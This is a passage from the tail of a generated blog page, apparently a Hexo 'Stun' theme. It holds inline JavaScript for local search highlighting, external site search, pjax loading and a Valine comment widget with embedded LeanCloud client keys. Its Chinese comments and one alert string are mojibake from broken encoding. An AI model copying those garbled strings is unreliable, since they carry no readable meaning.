            // å†…å®¹ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * è·å–åŒ¹é…çš„å…³é”®è¯çš„ç´¢å¼•
              * @param {String} keyword è¦åŒ¹é…çš„å…³é”®å­—
              * @param {String} text åŸæ–‡å­—
              * @param {Boolean} caseSensitive æ˜¯å¦åŒºåˆ†å¤§å°å†™
              * @param {Number} weight åŒ¹é…å¯¹è±¡çš„æƒé‡ã€‚æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // æ¯æ¬¡åŒ¹é…çš„å¼€å§‹ç´¢å¼•
                var index = -1;     // åŒ¹é…åˆ°çš„ç´¢å¼•å€¼
                var result = [];    // åŒ¹é…ç»“æœ

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // ç´¢å¼•ä½ç½®ç›¸åŒçš„å…³é”®è¯ï¼Œä¿ç•™é•¿åº¦è¾ƒé•¿çš„
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // æŒ‰ç…§åŒ¹é…æ–‡å­—çš„ç´¢å¼•çš„é€’å¢é¡ºåºæ’åº
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * ç»™æ–‡æœ¬ä¸­åŒ¹é…åˆ°çš„å…³é”®è¯æ·»åŠ æ ‡è®°ï¼Œä»è€Œè¿›è¡Œé«˜äº®æ˜¾ç¤º
              * @param {String} text åŸæ–‡æœ¬
              * @param {Array} hitSlice åŒ¹é…é¡¹çš„ç´¢å¼•ä¿¡æ¯
              * @param {Number} start å¼€å§‹ç´¢å¼•
              * @param {Number} end ç»“æŸç´¢å¼•
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // æ–‡ç« æ€»çš„æœç´¢æƒé‡
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„æ ‡é¢˜
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // æ ‡è®°åŒ¹é…å…³é”®è¯åçš„å†…å®¹
              var postContent;
              // æ˜¾ç¤ºå†…å®¹çš„é•¿åº¦
              var SHOW_WORD_LENGTH = 200;
              // å‘½ä¸­å…³é”®è¯å‰çš„å­—ç¬¦æ˜¾ç¤ºé•¿åº¦
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // æˆªå–åŒ¹é…çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œå‰åå…± 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // æœªåŒ¹é…åˆ°å†…å®¹ï¼Œç›´æ¥æˆªå–å‰ 200 ä¸ªå­—ç¬¦æ¥æ˜¾ç¤º
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // æŒ‰æƒé‡é€’å¢çš„é¡ºåºæ’åºï¼Œä½¿æƒé‡å¤§çš„ä¼˜å…ˆæ˜¾ç¤º
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', 'è¯·è¾“å…¥å­—ç¬¦');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
  // åŠ è½½è¿›åº¦æ¡çš„è®¡æ—¶å™¨
  var loadingTimer = null;

  // é‡ç½®é¡µé¢ Y æ–¹å‘ä¸Šçš„æ»šåŠ¨åç§»é‡
  document.addEventListener('pjax:send', function () {
    $('.header-nav-menu').removeClass('show');
    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
      $('html').velocity('scroll', {
        duration: 500,
        offset: $('#header').height(),
        easing: 'easeInOutCubic'
      });
    }

    var loadingBarWidth = 20;
    var MAX_LOADING_WIDTH = 95;

    $('.loading-bar').addClass('loading');
    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    clearInterval(loadingTimer);
    loadingTimer = setInterval(function () {
      loadingBarWidth += 3;
      if (loadingBarWidth > MAX_LOADING_WIDTH) {
        loadingBarWidth = MAX_LOADING_WIDTH;
      }
      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
    }, 500);
  }, false);

  window.addEventListener('pjax:complete', function () {
    clearInterval(loadingTimer);
    $('.loading-bar__progress').css('width', '100%');
    $('.loading-bar').removeClass('loading');
    setTimeout(function () {
      $('.loading-bar__progress').css('width', '0');
    }, 400);
    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
      $(this).remove();
    });
    $('script[data-pjax], #pjax-reload script').each(function () {
      $(this).parent().append($(this).remove());
    });

    if (Stun.utils.pjaxReloadBoot) {
      Stun.utils.pjaxReloadBoot();
    }
    if (Stun.utils.pjaxReloadScroll) {
      Stun.utils.pjaxReloadScroll();
    }
    if (Stun.utils.pjaxReloadSidebar) {
      Stun.utils.pjaxReloadSidebar();
    }
    if (false) {
      if (Stun.utils.pjaxReloadHeader) {
        Stun.utils.pjaxReloadHeader();
      }
      if (Stun.utils.pjaxReloadScrollIcon) {
        Stun.utils.pjaxReloadScrollIcon();
      }
      if (Stun.utils.pjaxReloadLocalSearch) {
        Stun.utils.pjaxReloadLocalSearch();
      }
    }
  }, false);
}, false);</script><div id="pjax-reload"><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script></div><script src="https://cdn.jsdelivr.net/npm/leancloud-storage@latest/dist/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script><script data-pjax="">function loadValine () {
  var GUEST_INFO = ['nick', 'mail', 'link'];
  var guest_info = 'nick,mail,link';

  guest_info = guest_info.split(',').filter(function(item) {
    return GUEST_INFO.indexOf(item) > -1;
  });
  new Valine({
    el: '#valine-container',
    appId: 'PRycUaQbxE5mebmnKTjtaRJg-gzGzoHsz',
    appKey: 'jGyP9zr05MTuqHpWaIkgYW4h',
    notify: true,
    verify: true,
    placeholder: 'å†™ç‚¹ä»€ä¹ˆå§',
    avatar: 'mp',
    meta: guest_info,
    pageSize: '10' || 10,
    visitor: true,
    recordIP: true,
    lang: 'zh-cn,en' || 'zh-cn',
    path: window.location.pathname
  });
}

if (true) {
  loadValine();
} else {
  window.addEventListener('DOMContentLoaded', loadValine, false);
}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>